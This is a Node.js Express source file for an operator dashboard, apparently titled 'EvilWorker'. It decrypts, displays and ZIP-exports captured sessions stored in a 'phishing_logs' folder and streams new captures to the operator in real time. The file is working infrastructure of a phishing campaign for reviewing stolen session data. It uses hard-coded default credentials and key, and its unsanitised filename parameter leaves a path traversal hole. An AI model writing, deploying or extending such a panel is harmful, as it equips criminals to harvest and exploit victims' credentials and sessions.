const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const WebSocket = require('ws');
const basicAuth = require('express-basic-auth');
const AdmZip = require('adm-zip');

const app = express();
const PORT = process.env.PORT || 3001;
const LOG_DIR = path.join(__dirname, 'phishing_logs');
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y';

// =============================================
// ✅ FIX: Ensure logs directory exists
// =============================================
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
}

// Password protect dashboard (set env DASHBOARD_USER / DASHBOARD_PASS)
const user = process.env.DASHBOARD_USER || 'admin';
const pass = process.env.DASHBOARD_PASS || 'evilworker2026';
app.use(basicAuth({
    users: { [user]: pass },
    challenge: true,
    realm: 'EvilWorker Dashboard'
}));

app.use(express.json());
app.use(express.static('public'));

// ---------- Decryption ----------
function decryptData(encryptedData, ivHex) {
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf-8');
}

// ---------- API: list logs ----------
app.get('/api/logs', (req, res) => {
    try {
        const files = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.log'));
        const logs = files.map(f => {
            const stat = fs.statSync(path.join(LOG_DIR, f));
            return { name: f, size: stat.size, modified: stat.mtime };
        }).sort((a, b) => b.modified - a.modified);
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ---------- API: get single log (decrypted) ----------
app.get('/api/log/:filename', (req, res) => {
    const filePath = path.join(LOG_DIR, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const entries = lines.map(line => {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                return JSON.parse(decrypted);
            } catch (e) {
                return { error: 'Failed to decrypt', raw: line };
            }
        });
        res.json({ filename: req.params.filename, entries });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ---------- API: export all logs as ZIP ----------
app.get('/api/export/all', (req, res) => {
    try {
        const files = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.log'));
        if (files.length === 0) return res.status(404).json({ error: 'No logs' });
        const zip = new AdmZip();
        files.forEach(f => {
            const content = fs.readFileSync(path.join(LOG_DIR, f));
            zip.addFile(f, content);
        });
        const zipBuffer = zip.toBuffer();
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
        res.send(zipBuffer);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ---------- API: status ----------
app.get('/api/status', (req, res) => {
    try {
        const files = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.log'));
        const last = files.length > 0 ? fs.statSync(path.join(LOG_DIR, files[0])).mtime : null;
        res.json({
            online: true,
            totalSessions: files.length,
            lastCapture: last
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ---------- WebSocket Server for real-time updates ----------
const server = app.listen(PORT, () => {
    console.log(`📊 Dashboard running on http://localhost:${PORT}`);
    console.log(`🔐 Login: ${user} / ${pass}`);
});

const wss = new WebSocket.Server({ server });
let clients = [];
wss.on('connection', (ws) => {
    clients.push(ws);
    ws.on('close', () => {
        clients = clients.filter(c => c !== ws);
    });
});

// =============================================
// ✅ FIX: Gracefully handle file watch errors
// =============================================
try {
    fs.watch(LOG_DIR, (eventType, filename) => {
        if (filename && filename.endsWith('.log')) {
            clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({ type: 'newLog', file: filename }));
                }
            });
        }
    });
} catch (err) {
    console.warn('⚠️ File watching not available on this platform. Frontend will poll.');
}
